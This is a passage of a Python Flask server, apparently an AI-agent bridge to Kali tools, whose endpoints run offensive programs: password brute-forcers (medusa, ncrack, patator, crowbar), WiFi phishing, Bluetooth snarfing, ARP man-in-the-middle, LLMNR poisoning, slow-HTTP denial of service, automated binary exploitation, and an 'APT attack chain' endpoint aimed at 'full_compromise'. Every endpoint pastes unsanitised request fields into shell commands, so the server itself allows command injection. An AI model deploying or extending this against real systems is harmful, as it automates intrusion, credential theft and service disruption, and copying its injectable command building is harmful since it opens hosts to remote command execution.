    """Execute Bettercap for network attacks."""
    try:
        params = request.json
        interface = params.get("interface", "")
        caplet = params.get("caplet", "")
        additional_args = params.get("additional_args", "")

        if not interface:
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"bettercap -iface {interface}"
        if caplet:
            command += f" -caplet {caplet}"
        command += f" {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in bettercap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/binwalk", methods=["POST"])
def binwalk():
    """Execute Binwalk for firmware analysis."""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        extract = params.get("extract", False)
        additional_args = params.get("additional_args", "")

        if not file_path:
            return jsonify({"error": "File path parameter is required"}), 400

        command = f"binwalk"
        if extract:
            command += " -e"
        command += f" {file_path} {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in binwalk endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/theharvester", methods=["POST"])
def theharvester():
    """Execute theHarvester for information gathering."""
    try:
        params = request.json
        domain = params.get("domain", "")
        sources = params.get("sources", "google,bing,yahoo")
        limit = params.get("limit", "500")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"theHarvester -d {domain} -b {sources} -l {limit} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in theharvester endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/netdiscover", methods=["POST"])
def netdiscover():
    """Execute Netdiscover for network discovery."""
    try:
        params = request.json
        interface = params.get("interface", "")
        range_ip = params.get("range", "")
        passive = params.get("passive", False)
        additional_args = params.get("additional_args", "")

        command = "netdiscover"
        if interface:
            command += f" -i {interface}"
        if range_ip:
            command += f" -r {range_ip}"
        if passive:
            command += " -p"
        command += f" {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in netdiscover endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/medusa", methods=["POST"])
def medusa():
    """Execute Medusa for password attacks."""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password_list = params.get("password_list", "/usr/share/wordlists/rockyou.txt")
        service = params.get("service", "ssh")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"medusa -h {target} -M {service}"
        if username:
            command += f" -u {username}"
        if password_list:
            command += f" -P {password_list}"
        command += f" {additional_args}"

        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in medusa endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== 新增工具端点 ====================

# 核心扫描工具
@app.route("/api/tools/zmap", methods=["POST"])
def zmap():
    """Execute Zmap network scanner."""
    try:
        params = request.json
        target = params.get("target", "")
        port = params.get("port", "80")
        rate = params.get("rate", "10000")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"zmap -p {port} --rate={rate} {additional_args} {target}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in zmap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 目录和Web扫描工具
@app.route("/api/tools/ffuf", methods=["POST"])
def ffuf():
    """Execute ffuf web fuzzer."""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        keyword = params.get("keyword", "FUZZ")
        additional_args = params.get("additional_args", "-c")

        if not url:
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"ffuf -w {wordlist}:{keyword} -u {url} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in ffuf endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/feroxbuster", methods=["POST"])
def feroxbuster():
    """Execute feroxbuster directory scanner."""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        threads = params.get("threads", "50")
        additional_args = params.get("additional_args", "")

        if not url:
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"feroxbuster -u {url} -w {wordlist} -t {threads} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in feroxbuster endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# DNS枚举工具
@app.route("/api/tools/dnsenum", methods=["POST"])
def dnsenum():
    """Execute dnsenum for DNS enumeration."""
    try:
        params = request.json
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"dnsenum {additional_args} {domain}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in dnsenum endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/fierce", methods=["POST"])
def fierce():
    """Execute fierce DNS scanner."""
    try:
        params = request.json
        domain = params.get("domain", "")
        threads = params.get("threads", "10")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"fierce --domain {domain} --threads {threads} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in fierce endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dnsmap", methods=["POST"])
def dnsmap():
    """Execute dnsmap for DNS mapping."""
    try:
        params = request.json
        domain = params.get("domain", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"dnsmap {domain}"
        if wordlist:
            command += f" -w {wordlist}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in dnsmap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/subfinder", methods=["POST"])
def subfinder():
    """Execute subfinder for subdomain enumeration."""
    try:
        params = request.json
        domain = params.get("domain", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not domain:
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"subfinder -d {domain}"
        if output_format == "json":
            command += " -o /dev/stdout -oJ"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in subfinder endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Web漏洞扫描工具
@app.route("/api/tools/joomscan", methods=["POST"])
def joomscan():
    """Execute joomscan for Joomla security testing."""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"joomscan -u {target} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in joomscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 密码攻击工具
@app.route("/api/tools/hashcat", methods=["POST"])
def hashcat():
    """Execute hashcat for password cracking."""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        attack_mode = params.get("attack_mode", "0")
        hash_type = params.get("hash_type", "")
        additional_args = params.get("additional_args", "")

        if not hash_file:
            return jsonify({"error": "Hash file parameter is required"}), 400

        command = f"hashcat -m {hash_type} -a {attack_mode} {hash_file} {wordlist} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in hashcat endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/ncrack", methods=["POST"])
def ncrack():
    """Execute ncrack for network authentication cracking."""
    try:
        params = request.json
        target = params.get("target", "")
        service = params.get("service", "ssh")
        username_file = params.get("username_file", "")
        password_file = params.get("password_file", "")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"ncrack -p {service} {target}"
        if username_file:
            command += f" -U {username_file}"
        if password_file:
            command += f" -P {password_file}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in ncrack endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/patator", methods=["POST"])
def patator():
    """Execute patator for multi-protocol brute-forcing."""
    try:
        params = request.json
        module = params.get("module", "ssh_login")
        target = params.get("target", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"patator {module} host={target}"
        if wordlist:
            command += f" password=FILE0 0={wordlist}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in patator endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/crowbar", methods=["POST"])
def crowbar():
    """Execute crowbar for brute force attacks."""
    try:
        params = request.json
        service = params.get("service", "ssh")
        target = params.get("target", "")
        username = params.get("username", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"crowbar -b {service} -s {target}"
        if username:
            command += f" -u {username}"
        if wordlist:
            command += f" -C {wordlist}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in crowbar endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/brutespray", methods=["POST"])
def brutespray():
    """Execute brutespray for brute force attacks from nmap output."""
    try:
        params = request.json
        nmap_file = params.get("nmap_file", "")
        username_file = params.get("username_file", "")
        password_file = params.get("password_file", "")
        threads = params.get("threads", "5")
        additional_args = params.get("additional_args", "")

        if not nmap_file:
            return jsonify({"error": "Nmap file parameter is required"}), 400

        command = f"brutespray --file {nmap_file} --threads {threads}"
        if username_file:
            command += f" --userlist {username_file}"
        if password_file:
            command += f" --passlist {password_file}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in brutespray endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 网络发现工具
@app.route("/api/tools/arp-scan", methods=["POST"])
def arp_scan():
    """Execute arp-scan for network discovery."""
    try:
        params = request.json
        interface = params.get("interface", "")
        network = params.get("network", "--local")
        additional_args = params.get("additional_args", "")

        command = f"arp-scan"
        if interface:
            command += f" --interface={interface}"
        command += f" {network} {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in arp-scan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/fping", methods=["POST"])
def fping():
    """Execute fping for fast ping sweeps."""
    try:
        params = request.json
        targets = params.get("targets", "")
        count = params.get("count", "3")
        additional_args = params.get("additional_args", "")

        if not targets:
            return jsonify({"error": "Targets parameter is required"}), 400

        command = f"fping -c {count} {additional_args} {targets}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in fping endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 无线安全工具
@app.route("/api/tools/bully", methods=["POST"])
def bully():
    """Execute bully for WPS attacks."""
    try:
        params = request.json
        interface = params.get("interface", "")
        bssid = params.get("bssid", "")
        additional_args = params.get("additional_args", "-v")

        if not interface or not bssid:
            return jsonify({"error": "Interface and BSSID parameters are required"}), 400

        command = f"bully -b {bssid} {interface} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in bully endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pixiewps", methods=["POST"])
def pixiewps():
    """Execute pixiewps for WPS PIN recovery."""
    try:
        params = request.json
        pke = params.get("pke", "")
        pkr = params.get("pkr", "")
        e_hash1 = params.get("e_hash1", "")
        e_hash2 = params.get("e_hash2", "")
        additional_args = params.get("additional_args", "")

        if not all([pke, pkr, e_hash1, e_hash2]):
            return jsonify({"error": "PKE, PKR, E-Hash1, and E-Hash2 parameters are required"}), 400

        command = f"pixiewps --pke {pke} --pkr {pkr} --e-hash1 {e_hash1} --e-hash2 {e_hash2} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in pixiewps endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/wifiphisher", methods=["POST"])
def wifiphisher():
    """Execute wifiphisher for WiFi phishing attacks."""
    try:
        params = request.json
        interface = params.get("interface", "")
        essid = params.get("essid", "")
        phishing_scenario = params.get("phishing_scenario", "firmware-upgrade")
        additional_args = params.get("additional_args", "")

        if not interface:
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"wifiphisher -i {interface} --phishingscenario {phishing_scenario}"
        if essid:
            command += f" --essid '{essid}'"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in wifiphisher endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 蓝牙工具
@app.route("/api/tools/bluesnarfer", methods=["POST"])
def bluesnarfer():
    """Execute bluesnarfer for Bluetooth attacks."""
    try:
        params = request.json
        target_mac = params.get("target_mac", "")
        action = params.get("action", "info")
        channel = params.get("channel", "1")
        additional_args = params.get("additional_args", "")

        if not target_mac:
            return jsonify({"error": "Target MAC address is required"}), 400

        command = f"bluesnarfer -b {target_mac} -C {channel}"
        if action == "backup":
            command += " -r backup.txt"
        elif action == "info":
            command += " -i"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in bluesnarfer endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/btscanner", methods=["POST"])
def btscanner():
    """Execute btscanner for Bluetooth device discovery."""
    try:
        params = request.json
        output_file = params.get("output_file", "/tmp/btscanner.xml")
        additional_args = params.get("additional_args", "")

        command = f"btscanner -o {output_file} {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in btscanner endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 网络攻击工具
@app.route("/api/tools/ettercap", methods=["POST"])
def ettercap():
    """Execute ettercap for network sniffing and MITM attacks."""
    try:
        params = request.json
        interface = params.get("interface", "")
        target1 = params.get("target1", "")
        target2 = params.get("target2", "")
        filter_file = params.get("filter_file", "")
        additional_args = params.get("additional_args", "-T")

        if not interface:
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"ettercap {additional_args} -i {interface}"
        if target1 and target2:
            command += f" -M arp:remote /{target1}// /{target2}//"
        if filter_file:
            command += f" -F {filter_file}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in ettercap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/responder", methods=["POST"])
def responder():
    """Execute Responder for LLMNR/NBT-NS poisoning."""
    try:
        params = request.json
        interface = params.get("interface", "")
        analyze_mode = params.get("analyze_mode", False)
        additional_args = params.get("additional_args", "")

        if not interface:
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"responder -I {interface}"
        if analyze_mode:
            command += " -A"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in responder endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dsniff", methods=["POST"])
def dsniff():
    """Execute dsniff for network sniffing."""
    try:
        params = request.json
        interface = params.get("interface", "")
        filter_expr = params.get("filter", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        command = f"dsniff"
        if interface:
            command += f" -i {interface}"
        if filter_expr:
            command += f" '{filter_expr}'"
        if output_file:
            command += f" -w {output_file}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in dsniff endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/ngrep", methods=["POST"])
def ngrep():
    """Execute ngrep for network grep."""
    try:
        params = request.json
        pattern = params.get("pattern", "")
        interface = params.get("interface", "")
        filter_expr = params.get("filter", "")
        additional_args = params.get("additional_args", "")

        command = f"ngrep"
        if pattern:
            command += f" '{pattern}'"
        if filter_expr:
            command += f" '{filter_expr}'"
        if interface:
            command += f" -d {interface}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in ngrep endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/tshark", methods=["POST"])
def tshark():
    """Execute tshark for network analysis."""
    try:
        params = request.json
        interface = params.get("interface", "")
        capture_filter = params.get("capture_filter", "")
        display_filter = params.get("display_filter", "")
        output_file = params.get("output_file", "")
        packet_count = params.get("packet_count", "100")
        additional_args = params.get("additional_args", "")

        command = f"tshark -c {packet_count}"
        if interface:
            command += f" -i {interface}"
        if capture_filter:
            command += f" -f '{capture_filter}'"
        if display_filter:
            command += f" -Y '{display_filter}'"
        if output_file:
            command += f" -w {output_file}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in tshark endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# DoS工具
@app.route("/api/tools/slowhttptest", methods=["POST"])
def slowhttptest():
    """Execute slowhttptest for HTTP DoS testing."""
    try:
        params = request.json
        target = params.get("target", "")
        attack_type = params.get("attack_type", "slowloris")
        connections = params.get("connections", "200")
        timeout = params.get("timeout", "240")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"slowhttptest -u {target} -c {connections} -t {timeout}"
        if attack_type == "slowloris":
            command += " -H"
        elif attack_type == "slow_post":
            command += " -B"
        elif attack_type == "slow_read":
            command += " -R"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in slowhttptest endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 后渗透工具
@app.route("/api/tools/armitage", methods=["POST"])
def armitage():
    """Execute armitage GUI (note: this will start the GUI)."""
    try:
        params = request.json
        additional_args = params.get("additional_args", "")

        # Note: Armitage is a GUI tool, so this might not work well in headless environment
        command = f"armitage {additional_args}"
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in armitage endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 信息收集工具
@app.route("/api/tools/amass", methods=["POST"])
def amass():
    """Execute amass for information gathering."""
    try:
        params = request.json
        subcommand = params.get("subcommand", "enum")
        domain = params.get("domain", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not domain and subcommand == "enum":
            return jsonify({"error": "Domain parameter is required for enum subcommand"}), 400

        command = f"amass {subcommand}"
        if domain:
            command += f" -d {domain}"
        if output_format == "json":
            command += " -json /dev/stdout"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in amass endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/recon-ng", methods=["POST"])
def recon_ng():
    """Execute recon-ng for reconnaissance."""
    try:
        params = request.json
        workspace = params.get("workspace", "default")
        module = params.get("module", "")
        options = params.get("options", {})
        additional_args = params.get("additional_args", "")

        # Create recon-ng resource script
        resource_content = f"workspaces select {workspace}\n"
        if module:
            resource_content += f"modules load {module}\n"
            for key, value in options.items():
                resource_content += f"options set {key} {value}\n"
            resource_content += "run\n"
        
        resource_file = "/tmp/recon_ng_resource.rc"
        with open(resource_file, "w") as f:
            f.write(resource_content)

        command = f"recon-ng -r {resource_file} {additional_args}"
        result = execute_command(command)
        
        # Clean up
        try:
            os.remove(resource_file)
        except:
            pass
            
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in recon-ng endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/sherlock", methods=["POST"])
def sherlock():
    """Execute sherlock for username enumeration across social networks."""
    try:
        params = request.json
        username = params.get("username", "")
        sites = params.get("sites", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not username:
            return jsonify({"error": "Username parameter is required"}), 400

        command = f"sherlock {username}"
        if sites:
            command += f" --site {sites}"
        if output_format == "json":
            command += " --json"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in sherlock endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/whatweb", methods=["POST"])
def whatweb():
    """Execute whatweb for web technology identification."""
    try:
        params = request.json
        target = params.get("target", "")
        aggression = params.get("aggression", "1")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not target:
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"whatweb -a {aggression}"
        if output_format == "json":
            command += " --log-json=/dev/stdout"
        command += f" {target} {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in whatweb endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# 网络攻击工具
@app.route("/api/tools/yersinia", methods=["POST"])
def yersinia():
    """Execute yersinia for network protocol attacks."""
    try:
        params = request.json
        protocol = params.get("protocol", "stp")
        interface = params.get("interface", "")
        attack_type = params.get("attack_type", "")
        additional_args = params.get("additional_args", "")

        command = f"yersinia {protocol}"
        if interface:
            command += f" -I {interface}"
        if attack_type:
            command += f" -attack {attack_type}"
        command += f" {additional_args}"
        
        result = execute_command(command)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in yersinia endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pwnpasi", methods=["POST"])
def pwnpasi():
    """Execute PwnPasi automated binary exploitation."""
    try:
        params = request.json
        binary_path = params.get("binary_path", "")
        remote_ip = params.get("remote_ip", "")
        remote_port = params.get("remote_port", "")
        libc_path = params.get("libc_path", "")
        padding = params.get("padding", "")
        verbose = params.get("verbose", False)
        additional_args = params.get("additional_args", "")

        if not binary_path:
            return jsonify({"error": "Binary path parameter is required"}), 400

        # Check if pwnpasi exists
        pwnpasi_path = "/opt/MCP-Kali-Server-main/pwnpasi/pwnpasi.py"
        if not os.path.exists(pwnpasi_path):
            # Try alternative path
            pwnpasi_path = "./pwnpasi/pwnpasi.py"
            if not os.path.exists(pwnpasi_path):
                return jsonify({"error": "PwnPasi not found. Please ensure pwnpasi.py is available"}), 500

        # Build command
        command = f"python3 {pwnpasi_path} -l {binary_path}"

        # Add remote parameters if provided
        if remote_ip and remote_port:
            command += f" -ip {remote_ip} -p {remote_port}"
        elif remote_ip or remote_port:
            return jsonify({"error": "Both remote_ip and remote_port must be specified for remote exploitation"}), 400

        # Add optional parameters
        if libc_path:
            command += f" -libc {libc_path}"
        if padding:
            command += f" -f {padding}"
        if verbose:
            command += " -v"
        if additional_args:
            command += f" {additional_args}"

        # Execute pwnpasi
        result = execute_command(command, timeout=300)  # 5 minute timeout for binary exploitation

        # Parse and enhance result for CTF mode
        if 'ctf_manager' in globals() and ctf_manager and ctf_manager.ctf_mode_enabled:
            output = result.get("output", "")
            # Look for flags in pwnpasi output
            flags = ctf_manager.detect_flags_in_text(output)
            if flags:
                result["flags_detected"] = flags
                for flag in flags:
                    ctf_manager.add_flag(flag, source="pwnpasi_exploitation")

        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in pwnpasi endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== 并发任务管理API端点 ====================

@app.route("/api/tasks/submit", methods=["POST"])
def submit_task():
    """提交单个任务"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500
            
        data = request.json
        tool_name = data.get("tool_name")
        parameters = data.get("parameters", {})
        priority = TaskPriority(data.get("priority", 2))  # 默认NORMAL
        timeout = data.get("timeout")
        tags = set(data.get("tags", []))
        metadata = data.get("metadata", {})
        
        if not tool_name:
            return jsonify({"error": "tool_name is required"}), 400
        
        task_id = task_manager.submit_task(
            tool_name=tool_name,
            parameters=parameters,
            priority=priority,
            timeout=timeout,
            tags=tags,
            metadata=metadata
        )
        
        return jsonify({
            "success": True,
            "task_id": task_id,
            "message": f"Task {task_id} submitted successfully"
        })
        
    except Exception as e:
        logger.error(f"Error submitting task: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/workflows/submit", methods=["POST"])
def submit_workflow():
    """提交工作流"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500
            
        data = request.json
        workflow_name = data.get("workflow_name", "")
        target = data.get("target")
        workflow_type = data.get("workflow_type", "comprehensive_web_scan")
        
        if not target:
            return jsonify({"error": "target is required"}), 400
        
        workflow_id = task_manager.submit_workflow(
            workflow_name=workflow_name,
            target=target,
            workflow_type=workflow_type
        )
        
        return jsonify({
            "success": True,
            "workflow_id": workflow_id,
            "message": f"Workflow {workflow_id} submitted successfully"
        })
        
    except Exception as e:
        logger.error(f"Error submitting workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/apt/attack-chain/submit", methods=["POST"])
def submit_apt_attack_chain():
    """提交APT攻击链"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        if not target:
            return jsonify({"error": "Target is required"}), 400

        target_info = data.get("target_info")
        attack_objective = data.get("attack_objective", "full_compromise")

        workflow_id = task_manager.submit_apt_attack_chain(
            target=target,
            target_info=target_info,
            attack_objective=attack_objective
        )

        return jsonify({
            "success": True,
            "workflow_id": workflow_id,
            "message": f"APT attack chain {workflow_id} submitted successfully"
        })

    except Exception as e:
        logger.error(f"Error submitting APT attack chain: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/apt/attack-surfaces/identify", methods=["POST"])
def identify_attack_surfaces():
    """识别目标攻击面"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target_info = data.get("target_info")
        if not target_info:
            return jsonify({"error": "Target info is required"}), 400

        surfaces = task_manager.apt_knowledge_graph.identify_attack_surfaces(target_info)

        return jsonify({
            "success": True,
            "attack_surfaces": [surface.value for surface in surfaces],
            "count": len(surfaces)
        })

    except Exception as e:
        logger.error(f"Error identifying attack surfaces: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/apt/attack-paths/generate", methods=["POST"])
def generate_attack_paths():
    """生成攻击路径"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target = data.get("target")
        target_info = data.get("target_info")

        if not target or not target_info:
            return jsonify({"error": "Target and target_info are required"}), 400

        # 识别攻击面
        surfaces = task_manager.apt_knowledge_graph.identify_attack_surfaces(target_info)

        # 生成攻击路径
        paths = task_manager.apt_knowledge_graph.generate_attack_paths(target, surfaces)

        # 序列化攻击路径
        serialized_paths = []
        for path in paths:
            serialized_paths.append({
                "id": path.id,
                "name": path.name,
                "target": path.target,
                "estimated_time": path.estimated_time,
                "stealth_score": path.stealth_score,
                "success_probability": path.success_probability,
                "concurrent_layers": path.concurrent_layers,
                "vectors": [
                    {
                        "id": v.id,
                        "name": v.name,
                        "surface": v.surface.value,
                        "phase": v.phase.value,
                        "tools": v.tools,
                        "stealth_level": v.stealth_level,
                        "success_rate": v.success_rate,
                        "impact_level": v.impact_level,
                        "mitre_technique": v.mitre_technique
                    }
                    for v in path.vectors
                ]
            })

        return jsonify({
            "success": True,
            "attack_paths": serialized_paths,
            "count": len(serialized_paths)
        })

    except Exception as e:
        logger.error(f"Error generating attack paths: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tasks/<task_id>/status", methods=["GET"])
def get_task_status(task_id):
    """获取任务状态"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500
            
        status = task_manager.get_task_status(task_id)
        if status is None:
            return jsonify({"error": "Task not found"}), 404
        
        return jsonify({
            "success": True,
            "task_status": status
        })
        
    except Exception as e:
        logger.error(f"Error getting task status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/workflows/<workflow_id>/status", methods=["GET"])
def get_workflow_status(workflow_id):
    """获取工作流状态"""
    try:
        if 'task_manager' not in globals() or task_manager is None:
            return jsonify({"error": "Task manager not initialized"}), 500
            
        status = task_manager.get_workflow_status(workflow_id)
        if status is None:
            return jsonify({"error": "Workflow not found"}), 404
        
        return jsonify({
            "success": True,
            "workflow_status": status
        })
        
    except Exception as e:
